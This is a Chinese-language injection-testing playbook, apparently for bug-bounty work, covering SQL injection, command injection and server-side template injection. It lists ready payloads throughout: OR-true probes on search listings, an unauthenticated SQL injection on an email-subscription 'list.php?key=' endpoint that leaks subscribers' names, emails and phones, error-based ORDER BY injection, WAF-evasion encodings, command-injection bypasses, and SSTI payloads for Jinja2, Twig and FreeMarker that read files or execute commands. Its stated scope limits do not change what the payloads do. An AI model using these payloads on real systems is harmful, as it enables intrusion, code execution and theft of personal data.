> 进站勾完标准见 `dig-scope` §4.2.1：能看出条数/内容变化的口，每个过滤参都测；只回「请登录」整段 N/A。按栈选探针（JSON/Mongo 操作符、搜索框 ES、Java HQL/SpEL、有模板 SSTI；SQL 面仍走引号/布尔/延时）。405 后换位置不只有换编码。
> 短表「列表筛选项 OR + total」「邮件订阅 iframe 同目录 list」用标题搜。WooYun 统计 / sqlmap --os-shell / 反弹 shell / 英文附件已砍；现场按栈自己变，不靠教材。

# 注入类漏洞测试手册（SQL注入 / 命令注入 / SSTI）

## SQL 注入

### 列表筛选项 OR + total（ES / 搜索列表）

企业流水、消费、员工名单这类列表，筛的是 `employeeName` / 姓名 / 关键字，回包带 `total` / `totalNum` / `totalSize`，后端经常是 ES 或「能跑一段 SQL 的搜索」。

**这枪很险。** `or (1)=(1)` 在流水/ES 上等于「去掉租户和日期，把全库匹配一遍」。回包 total 上亿是常态，一次查询就能打满集群、拖垮列表、把别的企业流水打到你屏幕上。证明用 **total 数字差分 + 第一条能看出不是自己的** 就停。

1. 先填不存在的串，应空或几条。  
2. 再布尔假：`')and (1)=(2)--` 仍应空（证明能改逻辑，还没放开全库）。  
3. 最后才恒真：`1')or (1)=(1)--+A`（`1=1` 被拦改 `(1)=(1)`）。**只打一枪。** 只看 total，pageSize 保持 1～5。  
4. 空/个位 → 十万、百万、上亿，且第一条是**别的员工/别的企业**流水，才算成。证明到此结束。  
5. **只约束本枪（OR 恒真打 ES/流水全库）：** 同一 payload 不连打/重放，pageSize 不拉满，不点下一页/导出，本枪不用 sqlmap `--dump` / `--risk=3`，不打到删除/更新口。打挂集群不算证明。  
6. 模糊搜索把 `or` 当关键字、或涨出来全是本企业本职可读 → 假点，不报。ES 只吃 Query DSL、这段 SQL 当普通字符串 → 换 DSL/`$where`，别死磕。

这是开场，不是只准打这一条，也**不是**禁止所有注入抽数。UNION / 延时 / 报错 / WAF 编码 / 其它注入口现场按栈自己变；延时比 OR 恒真更安全时优先延时。

### 邮件订阅 iframe 同目录 list（短表有指针）

认：邮件订阅嵌在 iframe 里；同目录 list 的 `key` 当鉴权、拼进 SQL。常见皮是 订阅表单皮 / `alertform.../main/index.php?id=租户`。

打（不登录）：

1. 从 iframe 抄租户 id  
2. 打同目录 `GET /main/list.php?key=`  
3. `key` 被拼进 SQL 当鉴权。`1' OR client_id=租户 LIMIT 1#`（只要这一枪）

算成：回包是该租户订户姓名/邮箱/电话。Wrong Key / 空数组是对照。

假点：没有 list.php；key 走常量比较或预编译。单站没中不删短表这行。不要对全站同皮客户开 FOFA。

### 快速检测

单引号 / 布尔假真 / 延时。405 后换 query / json / header / path。本枪 OR+total **不用** sqlmap `--dump` / `--os-shell`。

**SRC / 众测止步线**：拿到版本号、库名就够交。不 dump、不写文件、不提权。下面全是**判断**手法，不是深入利用。

### 报错辨析：真注入 vs 类型转换（防假点，先看这个）

单引号报错**不等于**注入。先分清错误发生在哪一层：

| 回包特征 | 判定 |
|---|---|
| 出现 `SQL syntax` / `You have an error in your SQL syntax` / `ORA-` / `SQLSTATE[42` 等**数据库语法**字眼 | **真注入** → 继续闭合测试 |
| `java.lang.Integer` / `NumberFormatException` / `Failed to convert value of type 'String'` | **假**：Java 强类型绑定，SQL 没见过这个畸形串 |
| `Invalid input syntax for type integer` / `"1'" must be an integer`（Django） | **假**：类型约束 |
| `InvalidArgumentException: invalid input syntax`（Laravel） | **假** |
| `Input string was not in a correct format` / `System.FormatException`（ASP.NET） | **假** |
| `PDOException: SQLSTATE[22018] Invalid character value for cast` | **假**（cast 报错，不是语法报错） |
| `A non-numeric value encountered`（PHP Warning） | **假**：`intval()` 一类强转 |
| `Invalid parameter: id must be an integer`（Node 校验库） | **假** |

一句话记：**见 `SQL syntax` 是真，见 `java.lang.Integer` 是假。** 判成假就直接换参数，别在这耗。

### 四单引号奇偶法（一枪判字符型，绕开 WAF）

```
?id=1'      报错
?id=1''     正常
?id=1'''    报错
?id=1'''''  正常     ← 奇数报错、偶数正常 = 字符型注入
```

**不要**用 `?id=1'--+` 或 `?id=1'AND '='` 做第一步 —— 这两个太像攻击签名，会被 WAF 直接拦，你得不出结论。**先判断，再决定要不要绕过。**

### 整形 vs 字符型

| | 整形 | 字符型 |
|---|---|---|
| 塞任意字符 | 单引号、双引号、`abcd` **全都报错**且闭合不上 | **只有单引号**报错，双引号不报错 |
| 算术差分 | `id=2-1` 结果 == `id=1` | 不适用 |
| 布尔差分 | `and 1=1` == 原结果；`and 1=2` 结果不同 | 需先闭合 |
| 闭合 | 不用引号 | 单引号 / 双引号 / 括号，现场试 |

### 注释符

两个常用：`--+` 和 `#`。

**坑**：GET 里 `#` 必须 URL 编码成 `%23`，否则被浏览器/客户端当片段截掉，永远无效。

### order by 注入（排序参数专属，四法判断）

排序参（`sort` / `orderBy` / `orderby` / `sortField`）不参与预编译，是重灾区。判断：

```
order by 1     → 正常（第 1 列存在）
order by 0     → 报错（第 0 列不存在）
order by 2     → 正常
order by 9999  → 报错（超列数，极大值）
```

符合这四条 → 排序注入。

**为什么 order by 挡不住**（理解原理才好打）：预编译只能给字符串**自动加引号**，而 order by 后面接的是**字段名 / 关键字 / 函数名**，加了引号就变成字符串常量、排序直接失效。所以凡是「是字符串又不能加引号」的位置都参数化不了 —— 库名、表名、字段名、函数名、SQL 关键字全算。正解是**白名单**，不是预编译。

**利用特点**：order by 后面**可以接函数并执行**，但不参与排序。所以：

- `if(...)` 产生的值不影响排序，只当常量 → 布尔盲注在 order by 上**不可靠**
- 但 `sleep()` 照样延时，报错函数照样报错
- **所以 order by 优先选报错注入**，其次延时

```
order by 1 desc,if(1=1,(updatexml(1,concat(0x7e,database(),0x7e),1)),0)
```

找 order 参数：Burp / Yakit 的 HAE 插件过一遍流量。

### JSON 型注入（前后端分离）

**先保证 JSON 结构是对的，再谈注入。** 结构错了，你的 payload 根本没到后端。

1. 参数是整形（`"mid":1`）→ **先给它补上双引号**再测，否则你插的单引号只会触发 `jsondecodeerror`，那是 JSON 解析报错，不是后端报错
2. 要在 JSON 里插双引号 → 得转义：`"stepname":"sampletest\""`（解析出来是 `sampletest"`）
3. 单引号打一串（1 个 / 2 个 / 3 个）**接口全 500 也不代表没有注入** —— 不要死盯 200，去看回包里**某个字符串值的变化**
4. 整形注入一定补双引号；不补的话一切输入都是 JSON 语法错误

### WAF 拦了再说（规则特征向）

**先判断出有注入，才回来绕过。** 顺序反了就是白忙。架构向绕过（真实 IP、分块、HPP）见 `waf-bypass.md`，这里只记 SQL 特有的等价变形。

| 被拦的东西 | 替代 |
|---|---|
| 空格 | `%20` `%09` `%0a` `%0b` `%0c` `%0d` `%a0` `%00` `/**/` `/*!*/` |
| 等号 `=` | `regexp`、`<>`（`'1'<>'2'` 为真） |
| 函数名 | 拆：`database/**/()`、`database/**/(/*!*/)`、`sleep/**/111*111/(/*!44444*/)` |
| 关键字 | 内联注释 `/*!SELECT*/`；带版本号 `/*!50728SELECT*/`（版本 ≥ 才执行，随机版本号绕过率更高） |
| 括号 | 同样用 `/**/` 拆 |

注释混脏数据也能过正则：`/*/**/`、`/*%0a/*%20%0a*/`、`/*%0a/*%091231**/`。

**URL 编码的边界**：发给后端时后端会先 URL 解码再进数据库，所以浏览 / Burp / Yakit 里用 URL 编码能绕 WAF。但**直连 MySQL 手工测试时不要用 URL 编码** —— 数据库不解码，你只会得到语法错误。

### JSON / Mongo 操作符（按栈，不是每个 path 喷引号）

`{"$ne":""}` / `{"$gt":""}` / `password[$ne]=x`。登录框不当业务参。出他主体或稳定差分才算。

## 命令注入

常见口：filename / ip / ping / 转换 / 诊断页 / 导出 / 压缩 / 邮件服务器 / traceroute。

探针按栈换，不要每个 path 喷 `;id`：

1. 时间差：`;sleep 5` / `|ping -c 5 127.0.0.1`。对照无 sleep 的基线。
2. 输出回显：`$(id)` / `` `id` `` 只在回包本来就回命令输出时用。
3. 空格被吃：`${IFS}` / `$IFS$9` / 换行 `%0a`。
4. 黑名单绕过：拼 `who''ami`、变量 `a=id;$a`。WAF 拦了再开 `waf-bypass.md`。
5. 盲打：带外只走本仓库已有 OOB（Yakit DNSLog / 自己的 collaborator），不要把反弹 shell 当教材。

算成：时间差稳定，或回包出现 `uid=` / 本机探针标记。

假点：前端过滤但后端没吃这个字段；报错只是「非法 IP」没有执行；只 500 没有差分。

**只约束本枪：** 证伪即可。不写 webshell、不反弹到你自己的 VPS、不 `rm`、不扫内网当进度。

## SSTI（服务端模板注入）

### 检测 Payload

```
{{7*7}}          → 如果返回 49，存在 SSTI
${7*7}           → Java/FreeMarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Thymeleaf (Spring)
```

### 常见框架利用

```python
# Jinja2 (Python/Flask)
{{config}}                           # 信息泄露
{{''.__class__.__mro__[2].__subclasses__()}}  # 获取类
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

---
